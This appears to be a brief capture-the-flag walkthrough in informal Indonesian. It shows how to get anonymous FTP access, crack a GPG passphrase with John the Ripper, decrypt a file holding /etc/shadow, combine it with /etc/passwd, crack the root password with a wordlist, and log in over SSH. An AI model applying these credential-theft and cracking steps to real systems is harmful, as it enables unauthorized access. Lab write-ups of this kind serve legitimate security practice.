1. scan nmap 21 22 -> ftp anonymous -> get user flag
2. klaim flag

PE :
1. ke / ada notread -> gpg ama asc get aja
2. gpg2john asc.asc > asc.hash -> john hash -> gpg --import asc.asc -> masukin passphrase 
3. gpg -d nama.pgp -> masukin passphrase
4. dapet etc shadow -> shadow tuh kek pass pass gitu passwd tuh kek !bin!bin gitu
5. get passwd dari ftp /etc -> unshadow passwd shadow.txt > sha_pass.txt
6. john rockyou sha_pass.txt -> ssh root@ip -> passwd itu
7. klaim root
